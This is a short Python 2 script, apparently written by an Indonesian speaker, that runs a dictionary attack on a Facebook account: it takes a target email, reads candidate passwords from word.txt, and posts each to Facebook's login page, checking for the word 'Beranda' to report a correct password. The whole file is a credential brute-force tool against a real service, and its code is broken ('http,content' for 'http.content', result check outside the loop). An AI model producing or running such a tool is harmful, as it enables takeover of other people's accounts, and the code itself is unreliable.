import requests
import sys

email= raw_input("email=")

url='https://www.facebook.com/login.php'

ex = open('word.txt', 'r'). readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url,data={'email':email,'pass':password , 'login':'submit'})
content = http,content
if "Beranda" in content:
 print "[+]passwd benar", password
 sys.exit(1)
else:
 print "[!]passwd salah ",password

